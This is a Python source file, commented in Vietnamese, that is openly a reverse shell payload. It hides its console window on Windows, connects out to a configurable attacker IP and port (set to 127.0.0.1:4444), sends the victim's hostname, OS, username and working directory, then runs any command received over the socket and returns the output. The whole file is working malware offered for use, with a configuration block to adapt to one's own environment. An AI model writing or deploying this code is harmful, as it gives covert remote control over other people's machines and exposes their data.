"""
Reverse Shell Payload
Kết nối ngược về attacker để điều khiển từ xa
"""

import socket
import subprocess
import os
import sys
import platform
import getpass
import time

class ReverseShell:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.socket = None
    
    def hide_console(self):
        """Ẩn cửa sổ console trên Windows"""
        if platform.system() == 'Windows':
            import ctypes
            ctypes.windll.user32.ShowWindow(
                ctypes.windll.kernel32.GetConsoleWindow(), 
                0  # SW_HIDE
            )
    
    def get_system_info(self):
        """Lấy thông tin hệ thống"""
        info = f"""
╔════════════════════════════════════════╗
║        SYSTEM INFORMATION              ║
╚════════════════════════════════════════╝
Hostname    : {platform.node()}
OS          : {platform.system()} {platform.release()}
Architecture: {platform.machine()}
User        : {getpass.getuser()}
Python      : {platform.python_version()}
CWD         : {os.getcwd()}
"""
        return info
    
    def execute_command(self, command):
        """Thực thi lệnh shell"""
        try:
            # Xử lý lệnh đặc biệt
            if command.strip().startswith('cd '):
                path = command.strip()[3:]
                try:
                    os.chdir(path)
                    return f"Changed directory to: {os.getcwd()}\n"
                except Exception as e:
                    return f"Error: {str(e)}\n"
            
            # Thực thi lệnh bình thường
            output = subprocess.check_output(
                command,
                shell=True,
                stderr=subprocess.STDOUT,
                timeout=30
            )
            return output.decode('utf-8', errors='ignore')
        
        except subprocess.TimeoutExpired:
            return "Error: Command timeout (30s)\n"
        except Exception as e:
            return f"Error: {str(e)}\n"
    
    def connect(self):
        """Kết nối đến attacker"""
        retry_count = 0
        max_retries = 5
        retry_delay = 5
        
        while retry_count < max_retries:
            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.connect((self.host, self.port))
                
                # Gửi thông tin hệ thống
                self.socket.send(self.get_system_info().encode())
                
                return True
            
            except Exception as e:
                retry_count += 1
                if retry_count < max_retries:
                    time.sleep(retry_delay)
                else:
                    return False
        
        return False
    
    def run(self):
        """Main loop"""
        self.hide_console()
        
        if not self.connect():
            sys.exit(0)
        
        try:
            while True:
                # Nhận lệnh
                command = self.socket.recv(4096).decode('utf-8').strip()
                
                if not command:
                    break
                
                # Lệnh thoát
                if command.lower() in ['exit', 'quit']:
                    self.socket.send(b"Goodbye!\n")
                    break
                
                # Thực thi và gửi kết quả
                output = self.execute_command(command)
                self.socket.send(output.encode())
        
        except Exception as e:
            pass
        
        finally:
            if self.socket:
                self.socket.close()
            sys.exit(0)

if __name__ == '__main__':
    # ============================================
    # CẤU HÌNH - THAY ĐỔI THEO MÔI TRƯỜNG CỦA BẠN
    # ============================================
    ATTACKER_IP = '127.0.0.1'  # IP của máy attacker
    ATTACKER_PORT = 4444            # Port listener
    
    shell = ReverseShell(ATTACKER_IP, ATTACKER_PORT)
    shell.run()